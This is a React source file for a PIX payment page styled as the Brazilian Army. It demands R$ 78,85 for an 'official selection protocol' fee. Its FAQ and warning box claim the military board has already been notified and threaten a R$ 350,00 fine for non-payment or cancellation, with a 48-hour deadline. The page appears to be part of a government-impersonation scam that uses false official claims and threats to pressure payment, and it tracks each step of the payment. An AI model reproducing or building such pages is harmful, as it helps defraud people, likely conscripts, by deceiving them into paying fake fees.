import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Copy, CheckCircle, AlertTriangle, Clock, Building, Users, FileCheck, ArrowRight } from 'lucide-react';
import { useClarityEvents } from '@/hooks/use-clarity-events';
import { getExamDateFormatted } from '@/utils/examDate';

export default function PagamentoPage() {
  const [, setLocation] = useLocation();
  const [pixCode, setPixCode] = useState('');
  const [qrCode, setQrCode] = useState('');
  const [copied, setCopied] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [examDate, setExamDate] = useState('');
  const [examTime, setExamTime] = useState('');
  const { trackPixCodeCopy, trackPixQRCodeView, trackPaymentMethod, trackEvent } = useClarityEvents();

  useEffect(() => {
    window.scrollTo(0, 0);
    
    const pixTransactionData = localStorage.getItem('pixTransaction');
    
    if (pixTransactionData) {
      try {
        const pixData = JSON.parse(pixTransactionData);
        setPixCode(pixData.pixCode || pixData.pix_qr_code || '');
        setQrCode(pixData.qrCode || pixData.qr_code_image || pixData.qrCodeImage || '');
        
        // Track PIX payment method selection
        trackPaymentMethod('pix', 78.85);
        
        // Track QR code view
        if (pixData.qrCode || pixData.qr_code_image || pixData.qrCodeImage) {
          trackPixQRCodeView(78.85, 0);
        }
        
        setExamDate(getExamDateFormatted());
        
        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
        setExamTime(userData.examTime || '08:00');
      } catch (error) {
        console.error('Error loading PIX transaction data:', error);
        setLocation('/validacao');
        return;
      }
    } else {
      setLocation('/validacao');
      return;
    }
  }, [setLocation]);

  const copyPixCode = () => {
    navigator.clipboard.writeText(pixCode).then(() => {
      setCopied(true);
      // Track PIX code copy action
      trackPixCodeCopy(78.85, 'click');
      setTimeout(() => setCopied(false), 3000);
    });
  };

  const steps = [
    { icon: Building, text: "Abra seu app bancário" },
    { icon: Copy, text: "Selecione PIX" },
    { icon: CheckCircle, text: "Escaneie ou cole o código" },
    { icon: FileCheck, text: "Confirme R$ 78,85" }
  ];

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentStep((prev) => (prev + 1) % steps.length);
    }, 2000);
    return () => clearInterval(timer);
  }, []);

  const faqItems = [
    {
      question: "Para que serve esta taxa?",
      answer: "Taxa obrigatória para emissão do Protocolo Oficial de Seleção e provisão de recursos para aplicação da prova."
    },
    {
      question: "Posso cancelar após o pagamento?",
      answer: "Não. Após o pagamento, a junta militar já provisiona recursos. Cancelamentos geram multa de R$ 350,00."
    },
    {
      question: "Quando expira o PIX?",
      answer: "O código PIX expira em 48 horas. Após isso, será necessário gerar um novo."
    },
    {
      question: "O que acontece se não pagar?",
      answer: "Você será multado em R$ 350,00 pois a junta já foi notificada e está provisionando a aplicação da prova."
    }
  ];

  const handleGoBack = () => {
    setLocation('/validacao');
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <ExercitoHeader />
      
      <main className="flex-1 container mx-auto max-w-4xl px-4 py-6">
        {/* Payment Header */}
        <div className="text-center mb-8">
          <h1 className="text-2xl font-semibold text-gray-900 mb-2">
            Taxa do Protocolo Oficial de Seleção
          </h1>
          <div className="text-3xl font-bold text-[#556B2F] mb-1">R$ 78,85</div>
          <p className="text-sm text-gray-600">
            Prova agendada para {examDate} às {examTime}
          </p>
        </div>

        <div className="grid lg:grid-cols-2 gap-8">
          {/* PIX Payment Section */}
          <Card className="border-0 shadow-sm">
            <CardContent className="p-6">
              <h2 className="text-lg font-medium text-gray-900 mb-6">Como pagar</h2>
              
              {/* Animated Tutorial */}
              <div className="mb-6">
                <div className="flex items-center justify-between mb-4">
                  {steps.map((step, index) => {
                    const Icon = step.icon;
                    return (
                      <div key={index} className="flex flex-col items-center">
                        <div className={`w-10 h-10 rounded-full flex items-center justify-center transition-all duration-500 ${
                          index === currentStep 
                            ? 'bg-[#556B2F] text-white scale-110' 
                            : 'bg-gray-200 text-gray-500'
                        }`}>
                          <Icon className="w-5 h-5" />
                        </div>
                        <span className={`text-xs mt-2 text-center transition-colors duration-500 ${
                          index === currentStep ? 'text-[#556B2F] font-medium' : 'text-gray-500'
                        }`}>
                          {step.text}
                        </span>
                      </div>
                    );
                  })}
                </div>
                <div className="w-full bg-gray-200 rounded-full h-1 mb-4">
                  <div 
                    className="bg-[#556B2F] h-1 rounded-full transition-all duration-500"
                    style={{ width: `${((currentStep + 1) / steps.length) * 100}%` }}
                  ></div>
                </div>
              </div>

              {/* QR Code */}
              <div className="bg-white rounded-lg border p-4 mb-4">
                {qrCode ? (
                  <img src={qrCode} alt="QR Code PIX" className="w-40 h-40 mx-auto object-contain" />
                ) : (
                  <div className="w-40 h-40 mx-auto bg-gray-100 rounded-lg flex items-center justify-center">
                    <p className="text-gray-500 text-sm">Carregando...</p>
                  </div>
                )}
              </div>

              {/* PIX Code Copy */}
              <div className="space-y-2">
                <label className="text-sm font-medium text-gray-700">Código PIX:</label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={pixCode}
                    readOnly
                    className="flex-1 px-3 py-2 text-xs border border-gray-300 rounded-lg bg-gray-50 font-mono"
                  />
                  <Button
                    onClick={copyPixCode}
                    className={`px-4 transition-all duration-300 ${
                      copied 
                        ? 'bg-green-600 hover:bg-green-700 scale-105' 
                        : 'bg-[#556B2F] hover:bg-[#414A2E]'
                    }`}
                  >
                    {copied ? (
                      <CheckCircle className="w-4 h-4" />
                    ) : (
                      <Copy className="w-4 h-4" />
                    )}
                  </Button>
                </div>
                {copied && (
                  <div className="flex items-center gap-2 text-green-600 text-sm animate-pulse">
                    <CheckCircle className="w-4 h-4" />
                    Código copiado com sucesso!
                  </div>
                )}
              </div>
            </CardContent>
          </Card>

          {/* Information Section */}
          <div className="space-y-6">
            {/* Where the money goes */}
            <Card className="border-0 shadow-sm">
              <CardContent className="p-6">
                <h3 className="text-lg font-medium text-gray-900 mb-4">Destino da Taxa</h3>
                <div className="space-y-3">
                  <div className="flex items-center gap-3">
                    <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center">
                      <FileCheck className="w-4 h-4 text-blue-600" />
                    </div>
                    <div>
                      <p className="text-sm font-medium">Protocolo Oficial</p>
                      <p className="text-xs text-gray-600">R$ 45,00</p>
                    </div>
                  </div>
                  <div className="flex items-center gap-3">
                    <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
                      <Users className="w-4 h-4 text-green-600" />
                    </div>
                    <div>
                      <p className="text-sm font-medium">Provisão de Recursos</p>
                      <p className="text-xs text-gray-600">R$ 25,00</p>
                    </div>
                  </div>
                  <div className="flex items-center gap-3">
                    <div className="w-8 h-8 bg-orange-100 rounded-full flex items-center justify-center">
                      <Building className="w-4 h-4 text-orange-600" />
                    </div>
                    <div>
                      <p className="text-sm font-medium">Logística da Prova</p>
                      <p className="text-xs text-gray-600">R$ 8,85</p>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Warning */}
            <Card className="border-red-200 bg-red-50">
              <CardContent className="p-6">
                <div className="flex items-start gap-3">
                  <AlertTriangle className="w-6 h-6 text-red-600 mt-0.5 flex-shrink-0" />
                  <div>
                    <h3 className="text-lg font-medium text-red-900 mb-2">
                      Aviso Importante
                    </h3>
                    <p className="text-sm text-red-800 mb-3">
                      A junta militar já foi notificada e está provisionando recursos para aplicação da prova em <strong>{examDate} às {examTime}</strong>.
                    </p>
                    <p className="text-sm text-red-800 font-medium">
                      ⚠️ Não pagamento resultará em multa de <strong>R$ 350,00</strong>
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* FAQ */}
            <Card className="border-0 shadow-sm">
              <CardContent className="p-6">
                <h3 className="text-lg font-medium text-gray-900 mb-4">Perguntas Frequentes</h3>
                <div className="space-y-3">
                  {faqItems.map((item, index) => (
                    <details key={index} className="group">
                      <summary className="flex items-center justify-between cursor-pointer text-sm font-medium text-gray-700 hover:text-[#556B2F] transition-colors">
                        {item.question}
                        <ArrowRight className="w-4 h-4 transition-transform group-open:rotate-90" />
                      </summary>
                      <p className="mt-2 text-sm text-gray-600 pl-4 border-l-2 border-gray-200">
                        {item.answer}
                      </p>
                    </details>
                  ))}
                </div>
              </CardContent>
            </Card>
          </div>
        </div>

        {/* Bottom Navigation */}
        <div className="flex justify-between items-center mt-8 pt-6 border-t border-gray-200">
          <Button
            onClick={handleGoBack}
            variant="outline"
            className="border-gray-300 text-gray-700 hover:bg-gray-50"
          >
            Voltar
          </Button>
          
          <div className="flex items-center gap-2 text-sm text-gray-600">
            <Clock className="w-4 h-4" />
            <span>PIX expira em 48 horas</span>
          </div>
        </div>
      </main>
      
      <ExercitoFooter />
    </div>
  );
}